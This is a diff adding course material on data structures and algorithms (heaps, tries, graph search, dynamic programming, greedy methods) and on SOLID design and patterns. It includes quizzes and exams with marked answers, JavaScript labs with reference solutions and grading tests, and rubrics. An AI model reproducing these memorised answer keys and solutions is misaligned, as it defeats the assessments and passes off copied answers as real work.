@@ -1,0 +1,2172 @@
+#COURSE c301
+#LESSON Heaps and priority queues | 13
+A queue serves whoever arrived first. Often you want whoever is **most important** first: the most urgent job, the nearest unexplored place, the smallest remaining number. That is a **priority queue**, and the structure behind it is the **heap**.
+
+A **binary min-heap** is a binary tree with two rules:
+
+1. **Shape:** every level is full except possibly the last, which fills from the left.
+2. **Order:** every node is less than or equal to its children.
+
+So the smallest item is always at the root.
+
+```diagram
+            2
+          /   \
+         5     3
+        / \   /
+       9   7 8
+
+   stored as an array:  [2, 5, 3, 9, 7, 8]
+   children of index i are at 2i+1 and 2i+2; the parent is at (i-1)/2
+```
+
+Because of the shape rule, the tree packs into an array with no pointers at all.
+
+### Operations
+- **Peek** at the minimum: O(1).
+- **Insert:** put the new item at the end, then **sift up**, swapping with its parent while it is smaller. O(log n).
+- **Remove the minimum:** move the last item to the root, then **sift down**, swapping with the smaller child while it is larger. O(log n).
+
+The tree's height is log n, and each operation walks one path from top to bottom or back.
+
+### What a heap is not
+A heap is only partly ordered. It gives you the smallest item fast, but it cannot search for an arbitrary value quickly or list everything in order without removing items one by one.
+
+### Uses
+- **Heap sort:** insert everything, remove everything. O(n log n), in place.
+- **Top k:** keep a heap of the k best items seen so far while scanning a huge stream.
+- **Scheduling** tasks by deadline or priority.
+- **Dijkstra's algorithm** for shortest paths, coming in this course.
+
+> In industry: Timer systems, job schedulers and "find the 10 slowest requests" tools are all priority queues underneath.
+#Q In a min-heap, where is the smallest item?
+* At the root
+- At the last leaf
+- Anywhere in the bottom level
+! The order rule makes every parent no larger than its children.
+#Q What is the cost of inserting into a heap of n items?
+- O(1)
+* O(log n)
+- O(n)
+! The new item sifts up along one path of length at most log n.
+
+#LESSON Balanced trees and tries | 13
+### Why balance matters
+A binary search tree is fast only while it stays bushy. **Self-balancing trees** restructure themselves during insertion and deletion so that the height stays O(log n).
+
+The basic repair is a **rotation**, which changes the shape while keeping the left-smaller, right-larger order.
+
+```diagram
+        y                  x
+       / \                / \
+      x   C     ==>      A   y
+     / \                    / \
+    A   B                  B   C
+```
+
+- **AVL trees** keep the heights of every node's two subtrees within 1 of each other.
+- **Red-black trees** colour nodes and enforce rules that keep the longest path at most twice the shortest. They do fewer rotations, so most language libraries use them for sorted maps and sets.
+
+### B-trees
+On disk, each step to a different node may cost a slow read. A **B-tree** makes nodes wide: each holds many keys and has many children, so the tree is very shallow. A B-tree holding a billion keys is typically only three or four levels deep. This is the structure behind nearly every database index.
+
+### Tries
+A **trie** (prefix tree) stores strings by their characters. Each edge is one character; each path from the root spells a prefix.
+
+```diagram
+           (root)
+           /    \
+          c      d
+          |      |
+          a      o
+         / \     |
+        r   t    g
+```
+
+This trie holds "car", "cat" and "dog". Looking up a word of length k takes k steps, however many words are stored. Better, every word sharing a prefix lives under the same node, which makes tries ideal for **autocomplete**, spell checking and routing tables.
+
+The cost is memory: one node per character.
+
+### Choosing an ordered structure
+| Need | Use |
+|---|---|
+| Fast lookup only, no order | hash table |
+| Sorted iteration, range queries | balanced tree |
+| Data on disk | B-tree |
+| Prefix queries on strings | trie |
+| Repeatedly take the smallest | heap |
+#Q Why do database indexes use B-trees rather than binary trees?
+- B-trees are easier to code
+* Wide nodes make the tree shallow, so few slow disk reads are needed
+- Binary trees cannot hold numbers
+! Each node visited may be one disk read; fewer levels means fewer reads.
+#Q Which structure is best for finding all words that start with "pre"?
+- Hash table
+- Heap
+* Trie
+! All words with a common prefix share a path in the trie.
+
+#LESSON Graph traversal and shortest paths | 15
+### Breadth-first search
+**BFS** visits a graph in rings: the start, then everything one edge away, then two edges away. It uses a queue.
+
+```js
+function bfs(graph, start) {
+  const dist = { [start]: 0 };
+  const queue = [start];
+  while (queue.length > 0) {
+    const v = queue.shift();
+    for (const w of graph[v]) {
+      if (!(w in dist)) { dist[w] = dist[v] + 1; queue.push(w); }
+    }
+  }
+  return dist;
+}
+```
+
+Because it reaches nearer vertices first, BFS finds the path with the **fewest edges**. Cost: O(V + E), every vertex and edge once.
+
+### Depth-first search
+**DFS** follows one path until it can go no further, then backs up. It is naturally recursive. DFS is the basis for detecting cycles, finding connected parts of a graph, and **topological sorting**: ordering tasks so that each comes after everything it depends on, which is how build tools and package managers decide what to do first.
+
+### Weighted shortest paths: Dijkstra
+When edges have different costs, fewest edges is no longer cheapest. **Dijkstra's algorithm** handles non-negative weights.
+
+1. Set the distance to the start to 0 and to everything else to infinity.
+2. Repeatedly take the unvisited vertex with the smallest known distance (a priority queue makes this fast).
+3. For each neighbour, check whether going through this vertex is shorter than the best known route. If so, update it. This step is called **relaxing** the edge.
+
+```diagram
+        4         1
+    A ------ B ------ D
+    |        |
+   1|       2|
+    |        |
+    C --------
+   shortest A to D:  A -> C -> B -> D  =  1 + 2 + 1 = 4   (not A -> B -> D = 5)
+```
+
+It is correct because once the nearest unvisited vertex is chosen, no later path could reach it more cheaply: all other routes already cost at least as much, and weights are never negative. With a heap it runs in O((V + E) log V).
+
+### Beyond Dijkstra
+Negative weights need **Bellman-Ford**. When you can estimate the remaining distance, **A\*** uses that to search toward the goal and is what games and map applications use.
+
+> In industry: Routing in maps and networks, dependency resolution, and "people you may know" suggestions are graph searches at scale.
+#Q What does breadth-first search guarantee in an unweighted graph?
+- The path with the lowest total weight
+* The path with the fewest edges
+- That every vertex is visited twice
+! Vertices are reached in order of their distance in edges.
+#Q What must be true of edge weights for Dijkstra's algorithm to be correct?
+* They are not negative
+- They are all equal
+- They are whole numbers
+! A negative edge could make an already-finalised vertex reachable more cheaply.
+
+#LESSON Dynamic programming | 15
+**Dynamic programming** (DP) solves problems that break into smaller subproblems which **overlap**: the same subproblem is needed many times. The cure for repeated work is to solve each subproblem once and remember the answer.
+
+Two conditions must hold:
+
+- **Optimal substructure:** the best solution is built from best solutions to subproblems.
+- **Overlapping subproblems:** the same subproblems recur.
+
+### Fibonacci, fixed
+Naive recursion is O(2ⁿ). Remembering results (**memoization**, top-down):
+
+```js
+function fib(n, memo = {}) {
+  if (n < 2) return n;
+  if (n in memo) return memo[n];
+  return (memo[n] = fib(n - 1, memo) + fib(n - 2, memo));
+}
+```
+
+Or fill a table from the smallest case upward (**tabulation**, bottom-up). Both are O(n).
+
+### A real problem: fewest coins
+Given coin values and an amount, what is the smallest number of coins that makes it?
+
+Define `best[a]` as the fewest coins that make amount `a`. To make `a`, the last coin is some coin `c`, and before it you had `a − c`. So:
+
+```text
+best[0] = 0
+best[a] = 1 + the minimum of best[a − c] over every coin c that is not larger than a
+```
+
+```js
+function fewestCoins(coins, amount) {
+  const best = new Array(amount + 1).fill(Infinity);
+  best[0] = 0;
+  for (let a = 1; a <= amount; a++)
+    for (const c of coins)
+      if (c <= a && best[a - c] + 1 < best[a]) best[a] = best[a - c] + 1;
+  return best[amount] === Infinity ? -1 : best[amount];
+}
+```
+
+With coins 1, 3, 4 and amount 6 the answer is 2 (3 + 3). Always taking the largest coin first would give 4 + 1 + 1, three coins. DP considers every option.
+
+### A method for DP problems
+1. **Define the subproblem** in words. This is the hard part.
+2. **Write the recurrence:** how a subproblem's answer comes from smaller ones.
+3. **Identify the base cases.**
+4. **Decide the order** to fill the table so needed answers already exist.
+5. **Count:** number of subproblems times the work per subproblem gives the running time.
+
+Classic DP problems worth practising: longest common subsequence, edit distance, the knapsack problem, longest increasing subsequence.
+#Q What two properties make a problem suitable for dynamic programming?
+- Sorted input and small size
+* Optimal substructure and overlapping subproblems
+- Recursion and randomness
+! Solutions are built from sub-solutions, and those sub-solutions recur.
+#Q What is memoization?
+- Writing comments in code
+* Storing the results of subproblems so each is computed only once
+- Sorting before searching
+! It removes the repeated work of naive recursion.
+
+#LESSON Greedy algorithms | 12
+A **greedy algorithm** builds a solution one step at a time, always taking the choice that looks best right now and never reconsidering. Greedy algorithms are simple and fast. The difficulty is that they are only sometimes correct.
+
+### When greedy works
+**Activity selection:** from a set of meetings with start and end times, attend as many as possible. The greedy rule "always pick the meeting that **ends earliest** among those you can still attend" is provably optimal. Finishing early leaves the most room for what follows.
+
+```js
+function maxMeetings(meetings) {
+  let count = 0, free = -Infinity;
+  for (const [start, end] of meetings.slice().sort((a, b) => a[1] - b[1])) {
+    if (start >= free) { count++; free = end; }
+  }
+  return count;
+}
+```
+
+Other correct greedy algorithms: Dijkstra (always expand the nearest vertex), **Huffman coding** (repeatedly merge the two rarest symbols), and the **minimum spanning tree** algorithms of Kruskal and Prim (repeatedly take the cheapest edge that does not form a cycle).
+
+### When greedy fails
+Coin change with coins 1, 3, 4 and amount 6: greedy takes 4, then 1, then 1. The optimum is 3 + 3. The locally best choice ruled out the globally best answer.
+
+### How to tell
+You must **prove** a greedy rule is correct; a few passing examples prove nothing. The usual argument is an **exchange argument**: take any optimal solution, show that swapping one of its choices for the greedy choice does not make it worse, and repeat until it has become the greedy solution.
+
+If you cannot find such an argument, look for a counterexample. Small ones are usually easy to find when greedy is wrong.
+
+### Greedy versus dynamic programming
+Both rely on optimal substructure. Greedy commits to one choice and solves one remaining subproblem. DP keeps all choices open and solves every subproblem. Greedy is faster when it is valid; DP is the fallback when it is not.
+
+### Greedy as approximation
+For problems too hard to solve exactly, a greedy rule often gives an answer that is provably close to the best. You will meet this in Stage 5.
+
+> Key idea: A greedy algorithm needs a proof. Without one it is only a heuristic.
+#Q What characterises a greedy algorithm?
+- It tries every possibility
+* It makes the locally best choice at each step and never reconsiders
+- It always uses recursion
+! That is why it is fast, and why it is sometimes wrong.
+#Q With coins 1, 3 and 4, greedy makes 6 from 4 + 1 + 1. What does this show?
+- Greedy is always optimal
+* A greedy rule can give a non-optimal answer, so it needs a proof
+- Coin problems have no solution
+! 3 + 3 uses fewer coins.
+
+#LAB js | Shortest paths and dynamic programming
+Implement three functions.
+
+- `shortestPath(graph, start, goal)` uses breadth-first search on an unweighted graph given as an adjacency object (`{ A: ["B", "C"], ... }`). It returns the number of edges on the shortest path, `0` if `start === goal`, or `-1` if `goal` cannot be reached.
+- `fewestCoins(coins, amount)` returns the fewest coins needed to make `amount`, or `-1` if it cannot be made. `fewestCoins([1, 3, 4], 6)` is 2.
+- `cheapestPath(graph, start, goal)` handles a **weighted** graph given as `{ A: { B: 4, C: 1 }, ... }` and returns the lowest total weight from `start` to `goal`, or `-1` if unreachable. Weights are positive. A simple Dijkstra that scans for the nearest unvisited vertex is fine.
+@starter
+function shortestPath(graph, start, goal) {
+  return -1;
+}
+
+function fewestCoins(coins, amount) {
+  return -1;
+}
+
+function cheapestPath(graph, start, goal) {
+  return -1;
+}
+@solution
+function shortestPath(graph, start, goal) {
+  const dist = { [start]: 0 };
+  const queue = [start];
+  for (let i = 0; i < queue.length; i++) {
+    const v = queue[i];
+    if (v === goal) return dist[v];
+    for (const w of graph[v] || []) {
+      if (!(w in dist)) { dist[w] = dist[v] + 1; queue.push(w); }
+    }
+  }
+  return -1;
+}
+
+function fewestCoins(coins, amount) {
+  const best = new Array(amount + 1).fill(Infinity);
+  best[0] = 0;
+  for (let a = 1; a <= amount; a++)
+    for (const c of coins)
+      if (c <= a && best[a - c] + 1 < best[a]) best[a] = best[a - c] + 1;
+  return best[amount] === Infinity ? -1 : best[amount];
+}
+
+function cheapestPath(graph, start, goal) {
+  const dist = { [start]: 0 };
+  const done = new Set();
+  while (true) {
+    let v = null;
+    for (const k in dist) if (!done.has(k) && (v === null || dist[k] < dist[v])) v = k;
+    if (v === null) return -1;
+    if (v === goal) return dist[v];
+    done.add(v);
+    const edges = graph[v] || {};
+    for (const w in edges) {
+      const d = dist[v] + edges[w];
+      if (!(w in dist) || d < dist[w]) dist[w] = d;
+    }
+  }
+}
+@tests
+shortestPath({ A: ["B", "C"], B: ["D"], C: ["D"], D: [] }, "A", "D") => 2
+shortestPath({ A: ["B"], B: ["A"] }, "A", "A") => 0
+shortestPath({ A: ["B"], B: [], C: [] }, "A", "C") => -1
+shortestPath({ A: ["B"], B: ["C"], C: ["A", "D"], D: [] }, "A", "D") => 3
+fewestCoins([1, 3, 4], 6) => 2
+fewestCoins([1, 5, 10, 25], 30) => 2
+fewestCoins([2], 3) => -1
+fewestCoins([1], 0) => 0
+fewestCoins([5, 7], 24) => 4
+cheapestPath({ A: { B: 4, C: 1 }, B: { D: 1 }, C: { B: 2 }, D: {} }, "A", "D") => 4
+cheapestPath({ A: { B: 7 }, B: {} }, "A", "B") => 7
+cheapestPath({ A: { B: 1 }, B: {}, C: {} }, "A", "C") => -1
+cheapestPath({ A: {} }, "A", "A") => 0
+cheapestPath({ A: { B: 1, C: 10 }, B: { C: 1 }, C: {} }, "A", "C") => 2
+@hints
+For BFS, record each vertex's distance the first time you see it. A vertex already in the distance map has been visited.
+A graph with a cycle will loop forever unless you skip vertices you have already seen.
+For coins, `best[a]` is 1 plus the smallest `best[a - c]` over the coins that fit. Use `Infinity` for "cannot be made".
+For Dijkstra, repeatedly choose the unvisited vertex with the smallest known distance, mark it done, then relax its outgoing edges.
+
+#EXAM 22
+#Q Which structure gives O(1) access to the smallest item and O(log n) insertion?
+- Hash table
+* Min-heap
+- Unsorted array
+! The minimum is at the root, and insertion sifts up one path.
+#Q What does a tree rotation preserve?
+- The height of the tree
+* The search-tree ordering of the keys
+- The number of leaves
+! Rotations change shape without breaking the left-smaller, right-larger rule.
+#Q Which algorithm orders tasks so each comes after its prerequisites?
+- Binary search
+* Topological sort
+- Heap sort
+! It is built on depth-first search of the dependency graph.
+#Q What is the running time of BFS on a graph with V vertices and E edges?
+- O(V²E)
+* O(V + E)
+- O(log V)
+! Each vertex is dequeued once and each edge examined once.
+#Q In the coin-change recurrence, what does best[a] depend on?
+- best[a + 1]
+* best[a − c] for each coin c that fits
+- Only best[0]
+! The last coin used leaves a smaller amount already solved.
+#Q What is the usual way to prove a greedy algorithm optimal?
+- Run it on ten examples
+* An exchange argument showing any optimal solution can be transformed into the greedy one
+- Measure its speed
+! Examples cannot prove optimality; an argument covering all inputs is needed.
+#Q Memoized Fibonacci runs in what time?
+* O(n)
+- O(2ⁿ)
+- O(n²)
+! Each of the n subproblems is solved once.
+#C js | Write `longestRun(items)` that returns the length of the longest run of equal consecutive values. `longestRun([1, 1, 2, 2, 2, 3])` is 3; an empty array gives 0.
+@starter
+function longestRun(items) {
+  return 0;
+}
+@solution
+function longestRun(items) {
+  let best = 0, run = 0;
+  for (let i = 0; i < items.length; i++) {
+    run = i > 0 && items[i] === items[i - 1] ? run + 1 : 1;
+    if (run > best) best = run;
+  }
+  return best;
+}
+@tests
+longestRun([1, 1, 2, 2, 2, 3]) => 3
+longestRun([]) => 0
+longestRun([5]) => 1
+longestRun([1, 2, 3]) => 1
+longestRun([4, 4, 4, 4]) => 4
+#W A delivery company wants the cheapest route between two depots on a road network where each road has a toll. Describe which algorithm you would use, why it is correct for this problem, what data structure it relies on, and one situation in which it would not apply.
++ Chooses Dijkstra's algorithm (or A* with justification)
++ Explains it handles weighted edges by always expanding the nearest unvisited vertex
++ Mentions the priority queue or heap
++ States the requirement of non-negative weights
++ Names an alternative for the excluded case (for example Bellman-Ford for negative weights)
+
+#PROJECT Route planner
+Build a route planner over a map you define (at least 20 places and 40 weighted connections).
+@requirements
+The map is stored as a graph loaded from a file
+The planner finds the route with the fewest stops (BFS) and the cheapest route (Dijkstra with a heap you wrote)
+The actual route is reported, not only its cost
+Unreachable destinations are handled
+There are tests, including a graph with cycles and a disconnected graph
+The README states the complexity of each algorithm
+@deliverables
+The source, tests and map data
+Three example queries with their output
+A note comparing your heap-based Dijkstra with a simple scan on a larger random graph
+@rubric
+Both searches are correct | 35
+The heap is implemented and used correctly | 20
+Routes are reconstructed correctly | 15
+Tests cover awkward graphs | 15
+Analysis and documentation | 15
+
+#COURSE c302
+#LESSON Single responsibility and open/closed | 13
+**SOLID** is five principles for designing classes and modules that stay easy to change. They are guidance for judgement, not rules to apply mechanically. This lesson covers the first two.
+
+### S: Single Responsibility Principle
+> A module should have one reason to change.
+
+"Reason to change" means one group of people or one kind of requirement. A class that calculates pay, formats a report and saves to the database changes when accounting rules change, when the report layout changes, and when the database changes. Three reasons, three sources of bugs.
+
+```js
+// before: one class, three responsibilities
+class Employee {
+  calculatePay() { /* accounting rules */ }
+  renderReport() { /* presentation */ }
+  save() { /* database */ }
+}
+
+// after
+class PayCalculator { calculate(employee) { /* ... */ } }
+class EmployeeReport { render(employee) { /* ... */ } }
+class EmployeeRepository { save(employee) { /* ... */ } }
+```
+
+Each piece can now be understood, tested and changed alone.
+
+A warning sign is a class named `Manager`, `Handler` or `Utils` that keeps growing. Another is being unable to describe a class without the word "and".
+
+### O: Open/Closed Principle
+> Software should be open for extension but closed for modification.
+
+You should be able to add new behaviour by **adding** code, without **editing** code that already works and is tested.
+
+```js
+// closed design: every new shape means editing this function
+function area(shape) {
+  if (shape.kind === "circle") return Math.PI * shape.r ** 2;
+  if (shape.kind === "rect") return shape.w * shape.h;
+}
+
+// open design: a new shape is a new class; nothing existing changes
+class Circle { area() { return Math.PI * this.r ** 2; } }
+class Rect { area() { return this.w * this.h; } }
+```
+
+Polymorphism is the usual mechanism. So is passing in functions, and plugin systems are the principle at full scale.
+
+### Do not over-apply
+You cannot make code open to every possible extension, and trying produces abstraction nobody needs. Wait until you see how the code actually changes. The second or third time a kind of change arrives, introduce the extension point for it.
+
+> In industry: "This class does too much" is the most frequent design comment in code review. The single responsibility principle is the vocabulary for it.
+#Q What does the single responsibility principle say about a module?
+- It should have only one method
+* It should have only one reason to change
+- It should be used by only one other module
+! Mixing concerns means unrelated changes collide in the same code.
+#Q How does the open/closed principle suggest adding a new payment type?
+- Edit every if statement that checks the payment type
+* Add a new class implementing the payment interface, leaving existing code unchanged
+- Copy the whole program
+! New behaviour arrives as new code.
+
+#LESSON Liskov, interface segregation and dependency inversion | 14
+### L: Liskov Substitution Principle
+> Wherever a type is expected, any of its subtypes must work correctly.
+
+A subclass must honour the promises of its parent: accept at least what the parent accepts, and deliver at least what the parent guarantees. The square-rectangle problem is the classic violation: code that sets a rectangle's width and expects the height to stay the same breaks when handed a square.
+
+Signs of a violation: a subclass method that throws "not supported", does nothing, or forces callers to check the concrete type first.
+
+### I: Interface Segregation Principle
+> No client should be forced to depend on methods it does not use.
+
+One large interface couples every user to everything in it. Prefer several small, focused ones.
+
+```ts
+// too broad: a simple printer must implement scan and fax
+interface Machine { print(d: Doc): void; scan(): Doc; fax(d: Doc): void; }
+
+// segregated
+interface Printer { print(d: Doc): void; }
+interface Scanner { scan(): Doc; }
+```
+
+### D: Dependency Inversion Principle
+> High-level modules should not depend on low-level modules. Both should depend on abstractions.
+
+The business logic is the valuable, stable part. The database, the email service and the framework are details that change. Yet naive code makes the important part depend on the details:
+
+```diagram
+   before:   OrderService ---------> MySqlDatabase
+
+   after:    OrderService ---> OrderRepository (interface)
+                                      ^
+                                      |  implements
+                               MySqlOrderRepository
+```
+
+The logic now owns an interface describing what it needs. The database code implements it. The dependency arrow of the detail points **toward** the logic: it has been inverted.
+
+```js
+class OrderService {
+  constructor(repository, mailer) {   // receives abstractions
+    this.repository = repository;
+    this.mailer = mailer;
+  }
+}
+```
+
+**Dependency injection** is the technique (hand dependencies in from outside). **Dependency inversion** is the principle (depend on abstractions you own).
+
+The payoff is large: the logic can be tested with fakes, the database can be replaced, and the core of the system does not change when its surroundings do.
+
+### SOLID in one sentence
+Keep things small and focused, depend on stable abstractions, and make change arrive as new code.
+#Q Which is a sign that the Liskov substitution principle has been violated?
+- A subclass adds a new method
+* A subclass overrides a method to throw "not supported"
+- A subclass has a longer name
+! The subclass cannot stand in for its parent.
+#Q What does dependency inversion ask business logic to depend on?
+- The concrete database class
+* An abstraction that the logic defines and the details implement
+- Nothing at all
+! Details depend on the policy, not the reverse.
+
+#LESSON Creational and structural patterns | 14
+Design patterns were catalogued in the 1994 book *Design Patterns* by Gamma, Helm, Johnson and Vlissides, often called the "Gang of Four". They fall into three families. This lesson covers the ones that create objects and the ones that compose them.
+
+### Creational patterns
+**Factory.** A function or class whose job is to create objects, hiding which concrete class is chosen. Callers ask for "a parser for this file" and receive one.
+
+**Builder.** Constructs a complicated object step by step, instead of through a constructor with twelve parameters.
+
+```js
+const request = new RequestBuilder()
+  .url("/users").method("POST").header("Accept", "application/json").body(data)
+  .build();
+```
+
+**Singleton.** Ensures a class has exactly one instance. It is the most overused pattern: a singleton is a global variable in disguise, hides dependencies and makes testing hard. Usually, create one instance at start-up and pass it to whoever needs it.
+
+### Structural patterns
+**Adapter.** Wraps an object so that it presents the interface your code expects. This is how you integrate a library or an old system whose interface does not fit.
+
+```js
+class StripeAdapter {
+  constructor(stripe) { this.stripe = stripe; }
+  pay(amount) { return this.stripe.charges.create({ amount: amount * 100, currency: "cad" }); }
+}
+```
+
+Your code depends on `pay(amount)`. Replace the provider and only the adapter changes.
+
+**Decorator.** Wraps an object to add behaviour while keeping the same interface. Decorators stack.
+
+```js
+const withLogging = (fn) => (...args) => {
+  console.log("calling with", args);
+  return fn(...args);
+};
+```
+
+Caching, retries, timing and access checks are commonly added this way.
+
+**Facade.** A simple front for a complicated subsystem: one `checkout()` method that coordinates inventory, payment and shipping.
+
+**Composite.** Treats single objects and groups of objects alike, in a tree. A folder and a file both have a size; a folder's size is the sum of its contents. User-interface trees are composites.
+
+**Proxy.** A stand-in that controls access to another object: loading it only when needed, checking permissions, or forwarding calls across a network.
+
+### Seeing the family resemblance
+Adapter, decorator and proxy are all "an object that wraps another". They differ in **intent**: adapter changes the interface, decorator adds behaviour, proxy controls access.
+#Q What is the purpose of the adapter pattern?
+- To create exactly one instance of a class
+* To make an object with an incompatible interface usable through the interface your code expects
+- To sort a collection
+! It translates between interfaces.
+#Q Why is the singleton pattern often criticised?
+- It is slow
+* It acts as hidden global state, which obscures dependencies and makes testing difficult
+- It cannot be written in JavaScript
+! Passing a single shared instance explicitly is usually better.
+
+#LESSON Behavioural patterns | 13
+Behavioural patterns organise how objects communicate and share responsibility.
+
+### Strategy
+Encapsulate an algorithm behind an interface so it can be chosen at run time: pricing rules, sorting orders, compression methods. You met this in Stage 2.
+
+### Observer
+A **subject** keeps a list of **observers** and notifies them of events. Subject and observers need not know each other's details. User-interface events, reactive front-end frameworks and message systems are built on it.
+
+Beware the costs: the flow of control becomes hard to follow, and observers that are never removed cause memory leaks.
+
+### Command
+Turn a request into an object with an `execute()` method, and usually an `undo()`.
+
+```js
+class AddTextCommand {
+  constructor(doc, text) { this.doc = doc; this.text = text; }
+  execute() { this.doc.append(this.text); }
+  undo() { this.doc.removeLast(this.text.length); }
+}
+```
+
+Once actions are objects you can queue them, log them, replay them and undo them. Undo stacks, job queues and macro recording all use this.
+
+### State
+When an object behaves differently depending on its state, and methods fill with `if (this.state === ...)`, give each state its own class and let the object delegate to the current one. An order that is `Draft`, `Paid`, `Shipped` or `Cancelled` is the standard example: "cancel" means something different in each.
+
+```diagram
+   Draft --pay--> Paid --ship--> Shipped
+     |              |
+   cancel         refund
+     v              v
+  Cancelled      Cancelled
+```
+
+Drawing the **state machine** first, with its allowed transitions, prevents a whole class of "that should not have been possible" bugs.
+
+### Template method
+A base class defines the skeleton of an algorithm and leaves certain steps to subclasses: "open, parse, validate, save", where only `parse` differs between file formats.
+
+### Iterator
+Provides a standard way to walk through a collection without exposing how it is stored. `for...of` in JavaScript and `for...in` in Python are built on it.
+
+### Chain of responsibility
+A request passes along a chain of handlers, each of which may handle it or pass it on. Web **middleware** works this way: logging, then authentication, then the route handler.
+
+### Patterns in modern languages
+Many patterns exist to work around missing language features. With first-class functions, a strategy is just a function, a command is a closure, and an iterator is built into the language. Know the idea; use the lightest form your language offers.
+#Q Which pattern makes undo straightforward to implement?
+- Adapter
+* Command
+- Facade
+! Each action becomes an object that knows how to reverse itself.
+#Q What problem does the state pattern address?
+- Too many classes
+* Methods cluttered with conditionals on the object's current state
+- Slow database queries
+! Each state gets its own class holding the behaviour for that state.
+
+#LESSON Refactoring toward better design | 12
+Good design is rarely produced in one attempt. It emerges by improving working code in small, safe steps. That is **refactoring**: changing structure without changing behaviour.
+
+### Code smells
+A **smell** is a surface sign that something deeper may be wrong.
+
+| Smell | Meaning | Typical remedy |
+|---|---|---|
+| Long function | does several things | extract functions |
+| Large class | several responsibilities | extract classes |
+| Long parameter list | a concept is missing | introduce a parameter object |
+| Duplicated code | one idea in several places | extract and reuse |
+| Switch on type, repeated | missing polymorphism | replace conditional with polymorphism |
+| Feature envy | a method mostly uses another class's data | move the method |
+| Shotgun surgery | one change touches many files | gather the scattered logic |
+| Primitive obsession | a string used for an email, a number for money | create small value types |
+
+### The safe procedure
+1. Make sure the code has **tests** and they pass. If there are none, write tests that pin down current behaviour first.
+2. Make **one small change**.
+3. Run the tests.
+4. Commit.
+5. Repeat.
+
+Never mix a refactoring with a behaviour change in the same commit. If something breaks, you will know which of the two caused it.
+
+### Refactoring to a pattern
+Patterns should be arrived at, not planned in advance. A typical journey:
+
+- One pricing rule: an expression.
+- Two rules: an `if`.
+- Four rules, with a fifth requested: now extract a strategy.
+
+The pattern is introduced at the moment it removes real pain.
+
+### Three rules against over-engineering
+- **YAGNI** ("you aren't gonna need it"): do not build for requirements that do not exist.
+- **KISS** ("keep it simple"): the simplest design that works is usually the best.
+- **Rule of three:** tolerate duplication twice; refactor on the third occurrence, when the real pattern is visible.
+
+### Working with legacy code
+Code without tests is frightening to change. The approach: find a **seam** where you can substitute a dependency, write tests that capture what the code does now (**characterisation tests**), then refactor behind them.
+
+> Key idea: Design is a continuous activity, not a phase. The best structure for today's requirements is found by refactoring as the requirements reveal themselves.
+
+> In industry: Most engineering time is spent in existing codebases. Improving them safely, a little at a time, is the practical form of design skill.
+#Q What is the first step before refactoring?
+- Rewrite the module from scratch
+* Make sure tests exist and pass, so behaviour changes are detected
+- Delete the old code
+! Tests are the safety net that makes structural change safe.
+#Q What does YAGNI advise?
+- Add every feature you can imagine
+* Do not build things until they are actually needed
+- Avoid writing tests
+! Speculative generality adds cost without benefit.
+
+#LAB js | Strategies, observers and an undo stack
+Implement three small designs.
+
+**1. Strategy.** `priceWith(strategy, amount)` returns `strategy(amount)`. Also define three strategies:
+- `noDiscount(amount)` returns the amount unchanged.
+- `percentOff(percent)` returns a strategy that takes `percent` percent off.
+- `capped(strategy, minimum)` returns a strategy that applies `strategy` but never returns less than `minimum`.
+
+**2. Observer.** A class `Emitter` with `on(event, fn)`, `off(event, fn)` and `emit(event, data)`. `emit` calls every listener registered for that event, in the order they were added, and returns how many were called.
+
+**3. Command.** A class `Editor` holding text (initially `""`), with `type(text)` which appends, `undo()` which reverses the most recent `type` (and does nothing if there is nothing to undo), and `value()` which returns the current text.
+@starter
+function priceWith(strategy, amount) {
+  return amount;
+}
+const noDiscount = (amount) => amount;
+function percentOff(percent) {
+  return (amount) => amount;
+}
+function capped(strategy, minimum) {
+  return (amount) => amount;
+}
+
+class Emitter {
+}
+
+class Editor {
+}
+@solution
+function priceWith(strategy, amount) {
+  return strategy(amount);
+}
+const noDiscount = (amount) => amount;
+function percentOff(percent) {
+  return (amount) => amount * (100 - percent) / 100;
+}
+function capped(strategy, minimum) {
+  return (amount) => Math.max(minimum, strategy(amount));
+}
+
+class Emitter {
+  constructor() { this.listeners = {}; }
+  on(event, fn) { (this.listeners[event] = this.listeners[event] || []).push(fn); }
+  off(event, fn) { this.listeners[event] = (this.listeners[event] || []).filter((f) => f !== fn); }
+  emit(event, data) {
+    const fns = (this.listeners[event] || []).slice();
+    fns.forEach((fn) => fn(data));
+    return fns.length;
+  }
+}
+
+class Editor {
+  constructor() { this.text = ""; this.history = []; }
+  type(text) { this.history.push(text.length); this.text += text; }
+  undo() {
+    if (this.history.length === 0) return;
+    const n = this.history.pop();
+    this.text = this.text.slice(0, this.text.length - n);
+  }
+  value() { return this.text; }
+}
+@tests
+priceWith(noDiscount, 80) => 80
+priceWith(percentOff(25), 80) => 60
+priceWith(percentOff(100), 80) => 0
+priceWith(capped(percentOff(90), 20), 100) => 20
+priceWith(capped(percentOff(10), 20), 100) => 90
+(() => { const e = new Emitter(); const log = []; e.on("a", (d) => log.push("1" + d)); e.on("a", (d) => log.push("2" + d)); const n = e.emit("a", "x"); return [n, log]; })() => [2, ["1x", "2x"]]
+(() => { const e = new Emitter(); return e.emit("nothing", 1); })() => 0
+(() => { const e = new Emitter(); const log = []; const f = () => log.push("f"); e.on("a", f); e.off("a", f); e.emit("a"); return log; })() => []
+(() => { const e = new Emitter(); const log = []; e.on("a", () => log.push("a")); e.emit("b"); return log; })() => []
+(() => { const ed = new Editor(); ed.type("Hello"); ed.type(", world"); return ed.value(); })() => "Hello, world"
+(() => { const ed = new Editor(); ed.type("Hello"); ed.type(", world"); ed.undo(); return ed.value(); })() => "Hello"
+(() => { const ed = new Editor(); ed.type("a"); ed.undo(); ed.undo(); ed.undo(); return ed.value(); })() => ""
+(() => { const ed = new Editor(); ed.type("ab"); ed.type("cd"); ed.undo(); ed.type("ef"); ed.undo(); ed.undo(); return ed.value(); })() => ""
+@hints
+A strategy is simply a function from amount to price. `percentOff` and `capped` return such functions.
+In `Emitter`, keep an object mapping each event name to an array of functions.
+`off` removes one specific function, so compare by identity with `!==`.
+For undo, remember what each `type` call did (for example the length it added) on a stack, and reverse the most recent one.
+
+#EXAM 20
+#Q A class named ReportManager fetches data, formats a PDF and emails it. Which principle does it most clearly violate?
+* Single responsibility
+- Liskov substitution
+- Interface segregation
+! It has three separate reasons to change.
+#Q Which principle is satisfied when a new export format can be added by writing a new class and changing no existing code?
+- Dependency inversion
+* Open/closed
+- Single responsibility
+! Extension without modification.
+#Q A Bird class has fly(), and a Penguin subclass overrides it to throw an error. Which principle is broken?
+- Open/closed
+* Liskov substitution
+- Dependency inversion
+! Penguin cannot be used wherever Bird is expected.
